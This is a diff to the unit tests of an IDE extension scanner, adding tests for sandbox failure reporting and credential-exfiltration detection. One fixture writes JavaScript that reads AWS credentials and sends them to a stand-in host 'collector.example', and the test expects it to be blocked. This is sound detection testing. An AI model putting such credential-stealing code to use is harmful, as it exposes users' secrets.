@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import hashlib
 import json
+import subprocess
 import unittest
 import zipfile
 from pathlib import Path
@@ -15,7 +16,7 @@ from ide_scanner.cli import _run_benchmark
 from ide_scanner.posture import scan_posture, summarize_posture
 from ide_scanner.registry import _marketplace_metadata_findings, _repository_metadata_findings
 from ide_scanner.report_bundle import build_report_bundle, iter_report_events, write_report_bundle
-from ide_scanner.sandbox_runner import _observations_from_trace, _prepare_target, run_sandbox
+from ide_scanner.sandbox_runner import _execute_entrypoint, _observations_from_trace, _prepare_target, run_sandbox
 from ide_scanner.models import Finding
 from ide_scanner.scanner import (
     _classify_findings,
@@ -238,6 +239,24 @@ class ScannerTests(unittest.TestCase):
         provider = extension.analysis_coverage["providers"]["dynamic_sandbox"]
         self.assertEqual(provider["status"], "completed")
         self.assertTrue(provider["executed"])
+
+    def test_failed_runtime_entrypoint_is_not_reported_as_completed(self) -> None:
+        failed = subprocess.CompletedProcess(
+            args=["node"], returncode=1, stdout="", stderr="activation failed",
+        )
+        with patch("ide_scanner.sandbox_runner._run_isolated", return_value=failed):
+            observations = _execute_entrypoint(
+                Path("/tmp/runner"),
+                Path("/tmp/home"),
+                Path("/tmp/workspace"),
+                5,
+                Path("/tmp/hook"),
+                Path("/tmp/trace"),
+                Path("/tmp/target"),
+            )
+        self.assertEqual(observations[0]["kind"], "sandbox_error")
+        self.assertEqual(observations[0]["phase"], "activation")
+        self.assertEqual(observations[0]["stderr_excerpt"], "activation failed")
 
     def test_range_derived_advisory_is_context_until_version_is_resolved(self) -> None:
         finding = Finding(
@@ -2167,6 +2186,49 @@ class ScannerTests(unittest.TestCase):
 
         self.assertNotEqual(report.verdict, "suspicious")
         self.assertNotIn("credential-exfiltration-chain", {finding.rule_id for finding in report.findings})
+
+    def test_credential_and_network_proximity_without_value_flow_stays_non_blocking(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"agent-client","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const fs=require('fs'),https=require('https');"
+                "const config=fs.readFileSync(process.env.HOME+'/.env','utf8');"
+                "const prompt=fs.readFileSync('/tmp/prompt.txt','utf8');"
+                "const req=https.request({hostname:'api.example'});req.write(prompt);req.end();",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertNotIn("credential-exfiltration-chain", rule_ids)
+        self.assertNotEqual(report.decision, "block")
+
+    def test_credential_path_alias_value_flow_remains_detected(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"path-alias-stealer","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const fs=require('fs'),https=require('https');"
+                "const secretPath='/home/user/.aws/credentials';"
+                "const secret=fs.readFileSync(secretPath);"
+                "const req=https.request({hostname:'collector.example'});req.write(secret);req.end();",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("credential-identifier-flow-to-network", rule_ids)
+        self.assertIn("credential-exfiltration-chain", rule_ids)
+        self.assertEqual(report.decision, "block")
 
     def test_previous_report_deltas_are_reported_without_changing_verdict(self) -> None:
         with TemporaryDirectory() as tmp:
